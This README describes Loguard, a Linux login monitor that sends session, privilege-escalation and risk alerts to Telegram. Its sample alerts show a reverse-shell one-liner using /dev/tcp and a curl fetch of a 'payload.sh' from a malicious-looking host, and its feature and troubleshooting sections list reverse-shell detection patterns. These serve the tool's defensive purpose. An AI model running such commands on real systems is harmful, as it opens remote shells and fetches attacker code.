# 🔐 Loguard — Real-Time Linux Login Alerts to Telegram

Loguard is a minimal, tamper-resistant login monitor for Linux that delivers **instant Telegram notifications** whenever anyone logs in via SSH, console, sudo, su, or graphical login. It's designed for cloud servers, home labs, and production systems where every unauthorized login attempt needs to be caught *immediately*.

**Why Loguard?**
- ✅ **Zero network latency on login** — PAM hook writes to a local queue; Telegram delivery happens async
- ✅ **Session Monitoring (v2)** — every login is classified, tracked end-to-end, and scored for risk
- ✅ **Tamper detection** — Automatically alerts if someone tries to disable the monitor
- ✅ **No external dependencies** — Uses only `curl`, `ps`, and standard Linux PAM; no libcurl dev headers needed
- ✅ **Self-healing** — Watchdog timer automatically re-applies PAM rules if they get deleted
- ✅ **Rich alerts** — Shows IP geolocation, SSH method (key/password), emoji indicators, and more
- ✅ **Automatic retry queue** — Offline? Alerts wait and retry when connection returns
- ✅ **One-liner install** — Single bash script handles distro detection, build, and config

---

## 🆕 Session Monitor v2

Loguard v2 turns the original "login notifier" into a **Session Monitoring Agent**. Instead of one flat alert per login, every session now gets:

| Capability | What it does |
|---|---|
| **Session Classification** | Labels every login as Interactive SSH, Console, Privilege Escalation (sudo), User Switch (su), Graphical, System Session (cron), or Background Service (systemd) |
| **Session ID** | A unique ID per session; every event (login, process, logout) is correlated to it |
| **Rich initial alert** | UID/GID, home, shell, TTY, auth method, hostname, and (for remote logins) GeoIP: country, city, ISP |
| **Process Monitoring** | Polls `ps` every few seconds for new processes under the session's TTY/user |
| **Suspicious Process Alerts** | Flags `curl`, `wget`, `nc`, `python`, `perl`, `php`, `docker`, `kubectl`, etc. spawned mid-session |
| **Reverse Shell Detection** | Pattern-matches `bash -i`, `nc -e`, `/dev/tcp/`, `socket.socket()`, `socat`, `mkfifo`, and similar one-liners |
| **Privilege Escalation Alerts** | Dedicated alert whenever `sudo`/`su`/`pkexec` is used |
| **Risk Engine** | Numeric score built from every event in the session; crossing the threshold fires an immediate HIGH RISK alert |
| **Session Summary** | On logout: full timeline, processes seen, privilege escalation flag, and final risk score |
| **Noise Reduction** | `cron`/`systemd`/`anacron`/`at` housekeeping sessions are logged locally but never sent to Telegram |

**Not included in this version** (reserved for a future update, see `src/risk_engine.hpp`):
- ❌ File integrity monitoring (`/etc/passwd`, `authorized_keys`, `sshd_config`, etc.)
- ❌ Network connection monitoring (active socket/connection tracking)

---

## 🚀 Quick Start

### 1. Create a Telegram Bot

```bash
# Message @BotFather on Telegram:
/newbot

# Name your bot (e.g., "My Server Monitor") and copy the Bot Token
# Start a chat with your new bot: /start

# Get your Chat ID by messaging @userinfobot
```

### 2. Install Loguard

```bash
# One-liner (downloads and installs from GitHub):
curl -fsSL https://raw.githubusercontent.com/Nowafen/Loguard/main/install.sh | sudo bash

# Or clone and install locally:
git clone https://github.com/Nowafen/Loguard.git
cd Loguard
sudo bash install.sh
```

During installation, you'll be prompted for:
- **Bot Token** — from @BotFather
- **Chat ID** — from @userinfobot (a number like `123456789`)
- **Device label** — how you want this server identified in alerts (e.g., "prod-db-1")

### 3. Test It

```bash
sudo loguard test
# A test message should arrive in your Telegram chat immediately
```

### 4. Check Status

```bash
loguard status
# Shows daemon health, PAM hook status, pending alerts, etc.
```

---

## 📱 Alert Examples

These are the *exact* formats the daemon builds (see `session.cpp` / `main.cpp`) — not mockups.

### 1) Initial alert — Interactive SSH login
```
🔐 Interactive Remote Login
━━━━━━━━━━━━━━━━━━━━
👤 User
root (uid=0)

🌍 Source
23.251.47.254
🇩🇪 Germany / Frankfurt
🏢 Hetzner Online GmbH

💻 Host
SSH_Ubuntu

🔑 Auth
Unknown

🖥 Shell
/bin/bash

📟 TTY
pts/3

🕒 Time
2026-07-23 10:38:11

🆔 Session
37b94815042cd08b
━━━━━━━━━━━━━━━━━━━━
Risk: 🟢 LOW (10)
```

### 2) Privilege Escalation (sudo used mid-session)
```
🔴 Privilege Escalation
━━━━━━━━━━━━━━━━━━━━
🆔 37b94815042cd08b
👤 root
⬆️ sudo bash
📟 pts/3
━━━━━━━━━━━━━━━━━━━━
Risk: +15 (total 25)
```

### 3) Suspicious process mid-session
```
⚠️ Suspicious Process
━━━━━━━━━━━━━━━━━━━━
🆔 37b94815042cd08b
👤 root
📋 curl http://malicious.com/payload.sh
📍 PID: 18271
━━━━━━━━━━━━━━━━━━━━
Risk: +20 (total 45)
```

### 4) Reverse shell detected (immediate high-severity alert)
```
🔴 REVERSE SHELL DETECTED ⚠️
━━━━━━━━━━━━━━━━━━━━
🆔 37b94815042cd08b
👤 root
❌ bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
📍 PID: 18299
━━━━━━━━━━━━━━━━━━━━
Risk: 🔴 HIGH (+100, total 145)
```

### 5) Session Summary (sent automatically at logout)
```
📋 Session Summary
━━━━━━━━━━━━━━━━━━━━
🆔 37b94815042cd08b
👤 root (uid=0)
🌍 23.251.47.254 🇩🇪 Germany
⏱ Duration: 45m 23s
━━━━━━━━━━━━━━━━━━━━
🕐 Timeline
10:38 Login
10:38 SSH Login (+10)
10:42 sudo bash
10:42 Privilege escalation via sudo (+15)
10:45 vim /etc/ssh/sshd_config
11:23 Logout

⚙️ Processes
bash sudo vim

🔐 Privilege Escalation: Yes
⚠️ Suspicious Events: 0
🌐 Network Connections: 0
━━━━━━━━━━━━━━━━━━━━
📊 Risk Score
SSH Login +10
Privilege escalation via sudo +15
─────────
Total: 🟡 MEDIUM (25)
```

### 6) Cron / systemd noise — no Telegram alert at all
Sessions classified as **System Session** (cron/anacron/at) or **Background Service** (systemd) are recorded in `/var/log/loguard/sessions.log` but are never sent to Telegram — this is exactly what fixed the "constant cron pings" issue:
```
2026-07-23 07:24:16 | START 9f2c... | System Session | user=root tty=cron ...
```

---

## 🎯 What Loguard Monitors

| Login Type | Monitored | Classification | Notes |
|---|---|---|---|
| SSH login (key or password) | ✅ Yes | Interactive Remote Login | GeoIP, risk score, full session tracking |
| Console / physical access | ✅ Yes | Console Login | Local login shown |
| `sudo` elevation | ✅ Yes | Privilege Escalation | Dedicated 🔴 alert |
| `su` elevation | ✅ Yes | User Switch | Tracked as its own session |
| `cron`, `at`, `anacron` scheduled jobs | ⏭️ Logged only | System Session | Never sent to Telegram (fixes cron noise) |
| `systemd` service activation | ⏭️ Logged only | Background Service | Never sent to Telegram |
| Graphical login (X11, Wayland) | ✅ Yes | Graphical Login | Lightdm, GDM, SDDM |
| FTP, IMAP, or other services | ❌ No | — | Use a separate service-specific tool |

### Automatic Filters (No-Noise Design)

The **PAM hook itself** (not just the daemon) never even writes an event for:
- `cron`, `crond`, `anacron`, `at`, `atd`, `batch`
- `systemd`, `systemd-user`

This is what stops the "New Login Detected / Service: cron" noise entirely — those events never reach the queue, let alone Telegram.

Everything else (including root logins, sudo, su) is tracked as a full Session. If you want different filtering, edit the noise lists in `src/pam_hook.c` (`noise_services[]`) and rebuild.

---

## 🚨 Troubleshooting

### Alerts Not Arriving

1. **Check config validity:**
   ```bash
   sudo loguard status
   ```
   Look for "Config: valid" line. If not valid, re-run:
   ```bash
   sudo loguard edit
   sudo loguard test
   ```

2. **Check daemon is running:**
   ```bash
   sudo systemctl status loguard
   ```
   If not running:
   ```bash
   sudo systemctl start loguard
   ```

3. **Check network connectivity:**
   ```bash
   curl -I https://api.telegram.org
   ```
   If it fails, your server can't reach Telegram's API. Contact your ISP or cloud provider.

4. **Check the queue:**
   ```bash
   loguard queue
   ```
   If there are pending messages, they'll be delivered once the daemon and network are OK.

### False Alerts from Cron/System

`cron`, `anacron`, `at`, `atd`, `batch`, `systemd`, and `systemd-user` are filtered **at the PAM hook itself** — no event is even written for them, so they should never reach Telegram. If you're still seeing noise from a *different* service:

1. Identify the noisy service:
   ```bash
   loguard sessions 50
   # Look for repeated START lines with the same service
   ```

2. Add it to `noise_services[]` in `src/pam_hook.c`

3. Rebuild:
   ```bash
   sudo bash install.sh
   ```

### Too Many / Too Few Suspicious-Process Alerts

The suspicious-binary list and reverse-shell patterns live in `src/pattern_matcher.cpp`:
- `suspicious_binaries()` — binaries that trigger a ⚠️ alert (curl, wget, nc, python, ...)
- `looks_like_reverse_shell()` — substrings that trigger an immediate 🔴 alert (`bash -i`, `nc -e`, `/dev/tcp/`, ...)

Edit either list and rebuild with `sudo bash install.sh`.

### "TAMPER ALERT" Messages

If you see PAM hook warnings:

1. **Check what's wrong:**
   ```bash
   sudo loguard status
   ```
   Look for "Integrity: PROBLEM DETECTED" or "PAM hook: TAMPERED"

2. **Re-apply the PAM rules:**
   ```bash
   sudo loguard restart
   ```

3. **Check integrity:**
   ```bash
   sudo loguard check
   ```

If the watchdog keeps complaining after a restart, your PAM files may be readonly or permission-locked. Check manually:

```bash
sudo ls -la /etc/pam.d/common-session
sudo grep loguard-notify /etc/pam.d/common-session
```

---

## 🏗️ Building from Source

### Prerequisites
- Linux kernel 5.0+ (any distro)
- `g++` (C++17 support)
- `gcc` (C support)
- `curl` (runtime, for Telegram + GeoIP lookups)
- `ps` / procps (runtime, for Session Monitor process tracking)
- `make`

### Build Steps

```bash
git clone https://github.com/Nowafen/Loguard.git
cd Loguard

# Build binaries
g++ -std=c++17 -O2 -o bin/loguard \
    src/main.cpp src/util.cpp src/config.cpp \
    src/telegram.cpp src/queue.cpp src/pam.cpp src/integrity.cpp \
    src/session.cpp src/session_queue.cpp \
    src/geoip.cpp src/risk_engine.cpp \
    src/pattern_matcher.cpp src/process_monitor.cpp

gcc -O2 -o bin/loguard-notify src/pam_hook.c

# Install
sudo install -m 0755 bin/loguard /opt/loguard/bin/loguard
sudo install -m 0755 bin/loguard-notify /opt/loguard/bin/loguard-notify
sudo ln -sf /opt/loguard/bin/loguard /usr/local/bin/loguard

# Setup systemd units, config, etc.
sudo bash install.sh
```

---

## 🔄 Updates

Loguard can self-update from GitHub:

```bash
sudo loguard update
```

This:
1. Checks GitHub for a newer version
2. Replaces the binary atomically
3. Restarts the daemon

If a checksum fails, the update is aborted (safer than deploying a potentially compromised binary).

---

**Happy monitoring! 🚀**
